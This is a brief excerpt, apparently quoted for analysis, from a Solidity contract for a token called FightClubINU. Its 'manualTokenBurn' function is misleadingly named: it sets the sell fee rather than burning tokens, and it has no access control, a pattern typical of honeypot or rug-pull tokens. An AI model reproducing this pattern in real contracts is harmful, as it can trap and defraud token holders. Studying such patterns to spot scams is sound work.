...
contract FightClubINU is Ownable, IERC20 {
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        uint256 finalAmount = !isFeeExempt[sender] && !isFeeExempt[recipient] ? extractafees(sender, recipient, amount) : amount;
    ...
    function extractafees(address sender, address recipient, uint256 amount) internal returns (uint256) {
    ...
    function manualTokenBurn(uint256 _amount) public {
    SellFee = _amount+BurnAmount;
    }
